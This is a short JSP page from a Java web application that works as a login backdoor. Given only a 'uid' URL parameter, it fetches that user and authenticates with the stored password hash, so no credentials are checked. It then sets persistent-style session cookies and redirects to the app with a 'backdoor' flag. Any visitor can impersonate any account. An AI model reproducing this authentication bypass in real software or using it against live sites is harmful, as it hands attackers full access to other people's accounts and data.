<%@ include file="./all.jsp"%>
<%
    Integer userId = StringUtils.parseInt(request.getParameter("uid"));

    if (userId == null) {
        out.println("No user id provided");
        return;
    }


    // Retrieving user
    User user = UserDao.getById(null, userId);

    if (user == null) {
        out.println("User does not exist");
        return;
    }

    Boolean persistent = false;

    // Login user persistently
    UserSession userSession = UserWebServices.authenticateAndCreateSession(webUtils, user.getEmail(), user.getPasswordHash(), persistent);

    // Install login cookies at client
    UserWebServices.installCookies(webUtils, user.getId(), userSession.getChecksum(), persistent);

    // Sending user to application
    webUtils.redirect("/d/app?backdoor");
%>
